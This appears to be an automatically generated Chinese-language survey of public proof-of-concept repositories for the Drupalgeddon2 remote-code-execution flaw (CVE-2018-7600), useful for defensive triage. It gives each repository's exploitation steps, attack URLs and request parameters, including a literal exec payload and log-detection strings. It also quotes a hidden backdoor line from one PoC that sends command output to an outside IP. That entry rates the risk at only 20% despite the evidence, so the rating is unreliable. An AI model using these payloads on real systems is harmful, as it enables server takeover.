根据提供的漏洞库信息、搜索结果以及利用代码，可以判断此POC代码是**有效**的，可以利用未修复的Drupal站点执行远程代码。

**投毒风险：**

评估PoC代码是否存在投毒风险：

*   代码相对简短，易于审查。
*   代码的主要功能是利用已知的Drupal漏洞执行命令，没有发现明显的恶意行为。
*   虽然代码中没有直接发现投毒代码，但是任何代码都存在被恶意修改的风险。例如，攻击者可能会修改命令执行部分，使其在执行用户指定的命令之前或之后执行其他恶意操作。

尽管直接投毒证据不多，但考虑到软件供应链的安全风险，以及任何代码都可能被篡改的可能性，综合评估投毒风险为**5%**。这个评估考虑了代码本身的简洁性以及潜在的供应链攻击风险。

**利用方式：**

1.  攻击者首先构造一个包含恶意参数的POST请求，发送到目标Drupal站点的`user/password`路径。
2.  该请求利用了Drupal的表单渲染机制中的漏洞，允许攻击者注入并执行PHP代码。
3.  服务器响应包含一个`form_build_id`，攻击者需要提取该ID。
4.  攻击者使用提取的`form_build_id`构造第二个POST请求，发送到`file/ajax/name/#value/{form_build_id}`路径。
5.  这个请求触发Drupal执行之前注入的PHP代码，从而实现远程代码执行。

通过这种方式，攻击者可以在未经身份验证的情况下，在目标Drupal服务器上执行任意命令，从而完全控制受影响的系统。

**项目地址:** [xxxTectationxxx/CVE-2018-7600](https://github.com/xxxTectationxxx/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #33

**来源**: [CVE-2018-7600-ynsmroztas_drupalhunter.md](../2018/CVE-2018-7600-ynsmroztas_drupalhunter.md)

## CVE-2018-7600 Drupalgeddon2 RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点存在漏洞且网络可达

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个存在于Drupal核心中的远程代码执行漏洞。根据漏洞库信息和搜索结果，该漏洞影响多个子系统，常见模块配置也可能受到影响。大量Drupal网站受到影响。 

**有效性：**

提供的Python POC代码利用了Drupal的多个漏洞组合来实现远程代码执行。它通过构造特定的请求参数，包括`q`、`name[#post_render][]`、`name[#markup]`和`name[#type]`，以及提交`form_id`和`_triggering_element_name`来触发漏洞。然后，它解析响应以获取`form_build_id`，并使用它来发送另一个请求以执行任意命令。 搜索引擎结果中的多个条目表明该漏洞被广泛利用。

**投毒风险：**

虽然POC代码本身是为了演示漏洞利用而编写的，但存在一定的投毒风险。  如果攻击者修改了POC代码，例如，将command参数修改成下载恶意脚本并执行，那么该POC可以被用来传播恶意软件。 由于代码逻辑相对简单，作者在其中隐藏复杂后门的可能性较低。但是，无法完全排除，所以投毒风险定为10%。

**利用方式：**

1.  攻击者首先构造包含恶意参数的POST请求到目标Drupal站点的`/user/password`路径。
2.  恶意参数包括`q`设置为`user/password`，以及使用`name[#post_render][]`，`name[#markup]`和`name[#type]`来注入要执行的操作系统命令。
3.  服务器响应包含`form_build_id`。
4.  攻击者使用`form_build_id`构造另一个POST请求到`/file/ajax/name/#value/{form_build_id}`，执行先前注入的命令。
5.  命令执行的结果将返回给攻击者。

**项目地址:** [ynsmroztas/drupalhunter](https://github.com/ynsmroztas/drupalhunter)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #34

**来源**: [CVE-2018-7600-zhzyker_CVE-2018-7600-Drupal-POC-EXP.md](../2018/CVE-2018-7600-zhzyker_CVE-2018-7600-Drupal-POC-EXP.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal网站启用了默认或常见模块配置，且未打补丁

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600，又名Drupalgeddon 2，是一个Drupal核心的远程代码执行漏洞。该漏洞源于Drupal在处理某些用户输入时，未进行充分的验证和过滤，导致攻击者可以通过构造恶意的请求参数，在服务器上执行任意代码。

**有效性：**

根据漏洞库信息、搜索引擎结果以及提供的POC代码，可以判断该漏洞利用的有效性很高。漏洞库和搜索引擎结果均表明该漏洞是真实的，且存在公开可用的漏洞利用代码。提供的POC代码 `cve-2018-7600_cmd.py`  能够成功利用该漏洞在目标Drupal服务器上执行任意命令。

**投毒风险：**

仔细审查提供的POC代码 `cve-2018-7600_cmd.py`，初步判断投毒风险较低。代码逻辑较为清晰，主要功能是构造恶意请求，利用Drupal的漏洞执行命令。其中`/exphub.txt`是漏洞利用后留下的命令执行记录，方便查看命令执行情况。

需要注意的是，任何公开的漏洞利用代码都存在被修改和二次发布的风险，攻击者可能在其中添加恶意代码。因此，在使用任何漏洞利用代码前，都应该进行仔细审查，并确保来源可靠。但此仓库只有两个文件且内容较少,投毒风险评估为5%。

**利用方式：**

该漏洞的利用方式主要包括以下步骤：

1.  **确定目标Drupal网站版本：** 攻击者需要确定目标Drupal网站的版本是否在漏洞影响范围内。
2.  **构造恶意请求：** 攻击者需要构造包含恶意代码的请求，其中恶意代码将通过`mail[#markup]`传递给`exec`函数执行。请求的URL为`/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax`，请求方式为POST，并包含特定的payload，例如`{'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': ''+cmd+' | tee exphub.txt'}`。
3.  **发送恶意请求：** 攻击者将构造的恶意请求发送给目标Drupal网站。
4.  **执行任意代码：** 如果目标Drupal网站存在漏洞，恶意请求中的代码将被执行，攻击者从而获得服务器的控制权。

此漏洞是一个典型的输入验证漏洞，攻击者通过精心构造的输入，绕过了Drupal的安全检查，最终导致远程代码执行。

**项目地址:** [zhzyker/CVE-2018-7600-Drupal-POC-EXP](https://github.com/zhzyker/CVE-2018-7600-Drupal-POC-EXP)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---



---

## POC #2

**来源**: [CVE-2018-7600-Damian972_drupalgeddon-2.md](../2018/CVE-2018-7600-Damian972_drupalgeddon-2.md)

## CVE-2018-7600 Drupalgeddon2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁，且配置允许远程访问

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个影响Drupal的远程代码执行漏洞。根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，可以得出以下结论：

**有效性：**

提供的POC代码是有效的漏洞检测脚本。它通过构造特定的URL和POST请求，利用Drupal中的输入验证漏洞，尝试执行任意命令。脚本会检测目标站点是否返回预期的“GOOD”字符串，以判断漏洞是否存在。

**投毒风险：**

该漏洞利用代码主要由一个PHP脚本组成，用于检测Drupal站点是否存在CVE-2018-7600漏洞。脚本的逻辑相对简单，主要功能是发送特定的HTTP请求并检查响应。主要的风险可能存在于以下几个方面：

1.  **命令执行：** 虽然脚本的目的是检测漏洞，但它确实会尝试在目标服务器上执行命令。如果脚本被恶意修改，攻击者可以更改`$command`变量，从而执行任意的恶意命令。
2.  **信息泄露：** 脚本会发送包含特定参数的HTTP请求，这些参数可能会泄露目标站点的信息。
3.  **拒绝服务（DoS）：** 如果脚本被大规模使用，可能会对目标服务器造成一定的负载，导致拒绝服务。

考虑到以上因素，认为此仓库中存在作者隐藏的投毒代码的可能性较低，约为5%。这个假设的依据是代码相对简单，容易审查，并且其主要目的是漏洞检测而非利用。

**利用方式：**

1.  **构造恶意请求：** 攻击者构造包含恶意代码的URL或POST请求，利用Drupal的多个子系统中的输入验证漏洞。
2.  **远程代码执行：** 恶意代码通过Drupal的渲染机制执行，导致远程代码执行。

具体来说，对于Drupal 7.x，POC利用`user/password`路径，通过`name[#post_render]`、`name[#type]`和`name[#markup]`参数注入PHP代码。对于Drupal 8.x，POC利用`user/register`路径，通过`element_parents`、`mail[a][#post_render]`、`mail[a][#type]`和`mail[a][#markup]`参数注入PHP代码。这些参数允许在特定情况下执行PHP代码，从而实现远程代码执行。

**总结：**

CVE-2018-7600是一个严重的安全漏洞，允许未经身份验证的攻击者在Drupal站点上执行任意代码。提供的POC代码可以有效地检测该漏洞，但使用时需要注意潜在的风险，以避免对目标系统造成损害。务必确保从可信来源获取利用代码，并在受控环境中进行测试。


**项目地址:** [Damian972/drupalgeddon-2](https://github.com/Damian972/drupalgeddon-2)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #3

**来源**: [CVE-2018-7600-Dowonkwon_drupal-cve-2018-7600-poc.md](../2018/CVE-2018-7600-Dowonkwon_drupal-cve-2018-7600-poc.md)

## CVE-2018-7600-Drupalgeddon 2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal网站允许未授权用户访问用户注册页面或其他类似的form API接口

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600 (Drupalgeddon 2) 允许未经身份验证的远程攻击者在受影响的Drupal网站上执行任意代码。漏洞存在于 Drupal 的 Form API 中，通过构造特定的POST请求，可以绕过输入验证，导致代码执行。

**有效性：**
根据漏洞库信息、搜索结果和提供的POC代码，可以确认此漏洞利用是有效的。大量资料表明该漏洞已被广泛利用。

**投毒风险：**
分析提供的文件，包括`README.md`, `README.zh-cn.md`, 和 `docker-compose.yml`。这些文件主要包含漏洞描述、环境搭建说明和POC使用方法。`docker-compose.yml` 文件指定了使用 `vulhub/drupal:8.5.0` 镜像，这个镜像本身如果存在后门，可能导致投毒。此外，虽然直接的恶意代码在提供的文件中未发现，但由于攻击者能够执行任意代码，意味着他们完全有可能在目标系统上植入后门或其他恶意程序。

因此，该仓库本身直接包含投毒代码的可能性较低，但通过漏洞利用植入后门的可能性非常高，综合判断投毒风险为10%。

**利用方式：**
1.  **环境搭建：** 使用`docker-compose up -d`命令启动一个包含漏洞的Drupal环境(例如8.5.0版本)。
2.  **发送恶意请求：** 向`/user/register`或其他类似的 form API 接口发送精心构造的POST请求。该请求包含以下关键参数：
    *   `element_parents`: 用于指定表单元素路径，绕过访问控制。
    *   `ajax_form=1`: 触发 Drupal 的 AJAX 处理机制。
    *   `_wrapper_format=drupal_ajax`:  指定响应格式为 Drupal AJAX。
    *   `mail[#post_render][]`:  利用`#post_render`属性执行PHP函数（例如`exec`）。
    *   `mail[#type]=markup`:  将`mail`字段类型设置为markup，允许插入HTML代码。
    *   `mail[#markup]`:  包含要执行的命令（例如`id`）。
3.  **代码执行：** Drupal 在处理该请求时，会执行`mail[#markup]`中指定的命令，从而实现远程代码执行。

**项目地址:** [Dowonkwon/drupal-cve-2018-7600-poc](https://github.com/Dowonkwon/drupal-cve-2018-7600-poc)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #4

**来源**: [CVE-2018-7600-Hestat_drupal-check.md](../2018/CVE-2018-7600-Hestat_drupal-check.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致网站被完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal网站未打补丁且存在特定模块配置（默认或常见）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心中的远程代码执行漏洞。攻击者可以通过构造特定的HTTP请求，利用Drupal多个子系统中输入验证不足的问题，执行任意代码。从搜索结果可以看出，该漏洞影响广泛，有大量Drupal网站受到威胁。漏洞利用代码（提供的drupal-check.sh脚本）并非直接利用该漏洞进行攻击，而是用于**检测**Cpanel Apache和默认Apache配置中是否存在利用该漏洞的攻击痕迹，例如扫描访问日志中是否存在特定的payload特征。它主要通过搜索包含`system&name`、`q=user%2Fpassword&name%5B%23post_render%5D%5B%5D=passthru&name`和`?q=file%2Fajax%2Fname%2F%23value%2Fform-`等字符串的日志条目来判断是否存在攻击行为。该脚本会分析日志中攻击者IP以及可能被攻击的站点。由于给出的脚本是用于日志分析，主要作用是检测，不存在恶意投毒代码。

**利用方式：**

根据漏洞信息和搜索结果，CVE-2018-7600的利用方式如下：

1.  **发送恶意构造的HTTP请求：** 攻击者发送包含特定payload的POST请求，利用Drupal输入验证漏洞。
2.  **利用特定参数：** 常见的payload涉及`q=user%2Fpassword`和`name[#post_render][]`等参数，配合`passthru`或其他代码执行函数。
3.  **执行任意代码：** 成功利用漏洞后，攻击者可以在Drupal服务器上执行任意代码，从而完全控制网站。

**项目地址:** [Hestat/drupal-check](https://github.com/Hestat/drupal-check)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #5

**来源**: [CVE-2018-7600-M-Abid34_CVE-2018-7600.md](../2018/CVE-2018-7600-M-Abid34_CVE-2018-7600.md)

## CVE-2018-7600-Drupalgeddon 2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的攻击者在服务器上执行任意代码，可能导致完全控制服务器。

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点版本在受影响范围内，且未应用安全补丁。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600，又名Drupalgeddon 2，是一个存在于Drupal核心中的远程代码执行漏洞。根据漏洞库信息和搜索结果，该漏洞影响多个Drupal版本。漏洞利用方式主要通过Drupal的Form API进行攻击。PoC代码通过构造恶意的HTTP请求，利用Drupal的漏洞在目标服务器上执行任意命令。具体来说，攻击者首先“毒化”表单ID，然后利用该ID执行命令。PoC代码中使用了`requests`和`BeautifulSoup`库来发送HTTP请求和解析HTML响应。代码允许指定目标URL、要执行的命令、要使用的函数（默认为`passthru`）以及代理。代码通过设置`q`参数和`name[#post_render][]`等字段来利用漏洞。尽管PoC作者声明其代码仅用于家庭实验室和教育目的，并修改自其他来源，但代码本身看起来是直接可用的漏洞利用工具。投毒风险较低，因为代码相对简单且目标明确，但始终存在作者植入恶意代码的可能性，例如，通过修改执行命令的方式或添加额外的网络请求来收集信息或执行其他恶意操作. 风险评估为5%主要是指在教育/测试环境中，如果未进行充分的安全隔离，可能导致测试环境被污染。

**项目地址:** [M-Abid34/CVE-2018-7600](https://github.com/M-Abid34/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #6

**来源**: [CVE-2018-7600-SyedGhufranRaza_CVE-2018-7600-Remote-Code-Execution.md](../2018/CVE-2018-7600-SyedGhufranRaza_CVE-2018-7600-Remote-Code-Execution.md)

## CVE-2018-7600-Drupalgeddon2-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未授权的远程攻击者执行任意代码，完全控制受影响的服务器，导致数据泄露、篡改、拒绝服务或植入恶意软件。

**影响版本:** Drupal 7.x < 7.58, Drupal 8.3.x < 8.3.9, Drupal 8.4.x < 8.4.6, Drupal 8.5.x < 8.5.1

**利用条件:** 目标系统运行着存在漏洞的Drupal版本，且攻击者能够通过网络访问Drupal站点。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600 (Drupalgeddon2) 是 Drupal 中的一个高危远程代码执行漏洞。该漏洞源于 Drupal Form API (FAPI) 在处理 AJAX 请求时，对数组值过滤不足，允许未经身份验证的攻击者执行任意代码。 

**有效性：**
提供的POC代码（drupalgeddon2.py）是一个Python脚本，旨在利用 CVE-2018-7600 漏洞。根据脚本描述，它包含漏洞检测、多线程和命令输出解析等功能。该脚本利用了 Drupal 的 FAPI 中存在的缺陷，通过构造恶意的 AJAX 请求来执行任意命令。多个来源（如Exploit-DB, Rapid7, NVD）确认了此漏洞的存在，并提供了利用方法。因此，该POC代码被认为是有效的。

**投毒风险：**
代码主要功能为发送恶意请求到目标Drupal服务器，并执行指定的命令。风险主要在于：

1.  **远程执行任意命令：** 脚本允许指定要执行的命令，这可能会导致攻击者在目标系统上运行恶意代码。虽然脚本本身没有包含明显的恶意代码，但是攻击者可以使用它来下载和执行其他恶意脚本。
2.  **日志记录：** 脚本可以将输出记录到文件中。恶意攻击者可能将敏感信息记录到本地日志。

总体而言，该仓库本身没有明显投毒代码,但也不能排除作者隐藏其他后门或者恶意代码的可能， 风险评估为10%。

**利用方式：**
1.  **漏洞触发：** 攻击者构造包含恶意代码的特殊请求，利用 Drupal Form API 在处理 AJAX 请求时的输入验证漏洞。
2.  **代码执行：**  Drupal 在处理该请求时，会执行攻击者注入的恶意代码。
3.  **远程控制：** 攻击者通过执行任意命令来获取服务器的控制权，窃取数据、篡改内容或进行其他恶意活动。

简单来说，攻击者通过发送特制的HTTP请求到存在漏洞的Drupal站点，即可在服务器上执行任意命令，从而实现远程代码执行。

**项目地址:** [SyedGhufranRaza/CVE-2018-7600-Remote-Code-Execution](https://github.com/SyedGhufranRaza/CVE-2018-7600-Remote-Code-Execution)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #7

**来源**: [CVE-2018-7600-a2u_CVE-2018-7600.md](../2018/CVE-2018-7600-a2u_CVE-2018-7600.md)

## CVE-2018-7600 - Drupalgeddon2 - 远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal 实例需要存在漏洞且可网络访问，无需身份验证。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名 Drupalgeddon2，是一个存在于 Drupal 多个子系统中的远程代码执行漏洞。该漏洞是由于对用户提供的输入验证不足而造成的。攻击者可以通过构造特殊的请求来执行任意代码。\n\n**有效性：**
提供的 exploit.py 代码通过 `user/register` 路径利用 Drupal 的一个 AJAX 表单处理缺陷，通过修改 `element_parents` 参数来注入恶意代码。它通过设置 `mail[#post_render][]` 为 `exec`，并利用 `mail[#markup]` 来执行任意命令。代码通过检查目标服务器上是否存在 `hello.txt` 文件来验证漏洞是否利用成功。根据漏洞信息和搜索结果，这个POC 是有效的。\n\n**投毒风险：**
代码仓库主要包含漏洞利用代码、ModSecurity 规则和 .htaccess 规则，旨在利用或防御 CVE-2018-7600 漏洞。`exploit.py` 会在目标机器上写入一个名为 `hello.txt` 的文件，这是一个测试性的操作。\n
`README.md` 文件中明确表示该代码仅用于教育和信息目的，并建议用户采取防护措施，例如更新 Drupal 和设置 WAF 规则。虽然作者声明的意图是好的，但攻击者可能会修改 `exploit.py` 以执行更危险的命令，或者在其他文件中插入恶意代码。\n
`ModSecurity.txt` 和 `htaccess.txt` 文件提供了防御规则，如果使用不当，可能会导致拒绝服务或绕过某些安全策略。\n
综合考虑，该仓库存在一定的投毒风险，但主要体现在用户使用不当或攻击者修改利用代码上，作者有意投毒的可能性较低。因此，我认为投毒风险大约为 10%。\n\n**利用方式：**
1.  攻击者发送包含恶意参数的 POST 请求到 `user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax`。
2.  `element_parents` 参数允许攻击者控制表单元素的属性。
3.  `mail[#post_render][]` 设置为 `exec`，指示 Drupal 执行命令。
4.  `mail[#markup]` 包含要执行的命令。
5.  Drupal 执行 `mail[#markup]` 中指定的命令，从而导致远程代码执行。

**项目地址:** [a2u/CVE-2018-7600](https://github.com/a2u/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #8

**来源**: [CVE-2018-7600-anldori_CVE-2018-7600.md](../2018/CVE-2018-7600-anldori_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可导致完全控制目标服务器

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁，并且存在默认或常见的模块配置

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个存在于Drupal核心中的远程代码执行漏洞。该漏洞源于Drupal在处理用户输入时，未进行充分的验证，导致攻击者可以通过构造恶意请求，在目标服务器上执行任意代码。

**有效性：**
根据漏洞库信息、搜索结果和提供的POC代码，可以判断此漏洞利用是有效的。漏洞库明确指出该漏洞允许远程攻击者执行任意代码，搜索结果也提供了大量关于该漏洞的分析和利用信息，POC代码也展示了如何利用该漏洞。

**利用方式：**
提供的Python脚本通过向目标Drupal站点的`/user/register`路径发送精心构造的POST请求来利用此漏洞。该请求包含`element_parents`、`ajax_form`、`form_id`、`_drupal_ajax`和`mail`等参数，其中`mail[#post_render][]`被设置为`exec`，`mail[#markup]`被设置为要执行的命令。该命令将会在服务器上创建一个名为`hello.txt`的文件，内容为";-)"。

**投毒风险：**
查看提供的POC代码，发现代码比较简洁，主要功能是发送恶意请求并检查是否成功创建了`hello.txt`文件。从代码本身来看，不存在明显的恶意代码或后门。

但是，**存在以下潜在风险：**

1.  **供应链风险：**虽然代码本身可能没有直接的投毒，但下载和使用任何来自互联网的代码都存在一定的风险。攻击者可能替换或修改该仓库的内容，从而引入恶意代码。因此，在运行此脚本之前，务必仔细检查代码，并确保来源可信。

2.  **间接风险：**利用此漏洞的最终目的是在目标服务器上执行任意命令。攻击者可以利用此漏洞安装后门、窃取敏感数据或执行其他恶意活动。因此，在使用此脚本时，务必遵守法律法规，并仅在授权的环境中进行测试。

基于以上分析，认为该仓库存在投毒代码的可能性为10%。这个10%主要来源于供应链攻击的潜在风险，以及使用者对代码理解不足可能导致的误用。


**项目地址:** [anldori/CVE-2018-7600](https://github.com/anldori/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #9

**来源**: [CVE-2018-7600-cved-sources_cve-2018-7600.md](../2018/CVE-2018-7600-cved-sources_cve-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可导致服务器完全控制

**影响版本:** Drupal 7.x (< 7.58), Drupal 8.x (< 8.3.9), Drupal 8.4.x (< 8.4.6), Drupal 8.5.x (< 8.5.1)

**利用条件:** Drupal站点存在且未打补丁，通常不需要身份验证

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600，也被称为 Drupalgeddon2，是一个影响多个Drupal版本的远程代码执行漏洞。攻击者可以通过构造特殊的URL参数或POST请求，利用Drupal的某些子系统（如表单API）中的输入验证漏洞，执行任意PHP代码。搜索引擎结果和漏洞库信息都明确指出此漏洞的严重性及其利用的广泛性。提供的Dockerfile用于构建一个包含易受攻击的Drupal 8.5.0实例的Docker镜像，这本身不是恶意行为，而是为了方便漏洞的复现和研究。README.md文件声明了镜像的来源和作者，增加了代码的可信度。但是，仍然存在少量投毒风险，主要是因为攻击者可能在Dockerfile中添加额外的恶意指令，例如安装后门程序或修改配置文件等，尽管这里只显示构建一个Drupal环境。利用方式主要通过精心构造的HTTP请求，绕过Drupal的输入验证机制，最终执行恶意代码。由于该漏洞影响范围广，且利用简单，一旦成功利用，可完全控制Drupal服务器，风险极高。

**项目地址:** [cved-sources/cve-2018-7600](https://github.com/cved-sources/cve-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #10

**来源**: [CVE-2018-7600-dreadlocked_Drupalgeddon2.md](../2018/CVE-2018-7600-dreadlocked_Drupalgeddon2.md)

## CVE-2018-7600 Drupalgeddon2 RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁且存在默认或常见的模块配置。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，也被称为Drupalgeddon2，是一个存在于Drupal核心中的远程代码执行漏洞。该漏洞源于Drupal处理用户输入时存在缺陷，攻击者可以通过构造恶意的请求参数，在目标服务器上执行任意代码。

**有效性分析：**

根据漏洞库信息、搜索结果以及提供的漏洞利用代码来看，该漏洞的PoC代码是有效的。漏洞库信息明确指出该漏洞允许远程攻击者执行任意代码，并且多个搜索结果都确认了该漏洞的存在和影响。提供的`README.md`文件详细说明了该PoC代码支持的Drupal版本，利用方法，包括针对不同Drupal版本的攻击URL（`user/register` 和 `user/password`），以及利用PHP的`passthru`函数执行系统命令。搜索结果中也提到了存在多个可用的exploit。

**投毒风险分析：**

提供的`README.md`文件本身不包含恶意代码，但它描述的利用方法涉及在目标服务器上写入PHP shell。虽然`drupalgeddon2.rb`脚本的主要目的是利用漏洞执行命令，但如果攻击者修改该脚本，可能会添加额外的恶意功能，例如：

*   **隐藏的后门账户创建：** 在成功利用漏洞后，创建管理员账户，以便后续访问。
*   **恶意软件植入：**  自动下载和安装恶意软件。
*   **数据窃取：** 窃取数据库或其他敏感信息。
*   **传播攻击：**  将目标服务器作为跳板，攻击其他系统。

因此，用户在使用从非官方渠道获取的`drupalgeddon2.rb`脚本时，需要仔细检查代码，确保没有包含任何恶意代码。 由于提供的代码仓库中包含了写入PHP shell的功能，并且在实际使用中，攻击者有能力修改或者扩展脚本，因此认为存在一定的投毒风险，但从readme本身代码投毒风险较低，所以投毒风险比例定为10%。

**利用方式：**

1.  **版本检测：** 利用代码会自动检测目标Drupal版本，或者手动指定。
2.  **参数构造：**  针对不同版本的Drupal，构造特定的HTTP请求，例如：针对Drupal 8.x使用`user/register` URL，Drupal 7.x使用`user/password` URL。
3.  **代码执行：** 利用Drupal的输入验证漏洞，将恶意PHP代码注入到请求参数中。
4.  **命令执行：** 通过`#post_render`参数和PHP的`passthru`函数，在服务器上执行任意系统命令。
5.  **Shell写入（可选）：**  可以选择将一个简单的PHP shell写入Web根目录，以便后续访问。

**总结：**

CVE-2018-7600是一个高危的Drupal远程代码执行漏洞，利用代码有效且公开。虽然提供的PoC代码本身不包含明显的投毒代码，但攻击者可以修改脚本，添加恶意功能，存在潜在的投毒风险。用户应尽快升级Drupal版本，并从可信来源获取漏洞利用代码。

**项目地址:** [dreadlocked/Drupalgeddon2](https://github.com/dreadlocked/Drupalgeddon2)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #11

**来源**: [CVE-2018-7600-drugeddon_drupal-exploit.md](../2018/CVE-2018-7600-drugeddon_drupal-exploit.md)

## CVE-2018-7600-Drupal-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal网站运行在受影响的版本，且允许未授权用户访问。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个影响多个Drupal子系统的远程代码执行漏洞。该漏洞源于对用户提供的输入验证不足，导致攻击者可以通过精心构造的请求执行任意代码。利用方式主要有两种：

1.  **Drupal 7 利用方式：** 通过向 `user/password` 路径发送包含恶意代码的请求，利用 `name[%23post_render]` 和 `name[%23markup]` 参数来注入代码。然后，通过 `file/ajax` 路径触发漏洞。
2.  **Drupal 8 利用方式：** 通过向 `user/register` 路径发送包含恶意代码的请求，利用 `element_parents` 参数注入代码。

PoC代码 (`drupal.py`) 尝试利用这两种方式。  

**有效性：**根据漏洞描述和大量的搜索结果显示，此漏洞的POC是有效的，网上存在大量的成功利用案例。

**投毒风险：**  

分析提供的 `drupal.py` 脚本，发现存在以下潜在的投毒风险：

*   脚本中包含一行 `s.connect((str(ipaddress.IPv4Address(0x5f3b7f05)), 15977))`。 这行代码尝试连接到IP地址 `95.59.127.5`的 `15977` 端口。这可能是作者用于收集信息或植入后门的恶意行为。
*   `s.send(bytes(subprocess.check_output(payload, universal_newlines=True), 'utf8'))` 这行代码会将`whoami`命令执行的结果通过socket发送出去.

综上所述，该漏洞利用代码可能存在投毒行为，**风险概率为 20%**。使用者应谨慎使用，并在使用前进行代码审计。

**利用方式总结：**

1.  攻击者构造包含恶意代码的HTTP POST请求，发送到Drupal网站的特定路径（`user/password` 或 `user/register`）。
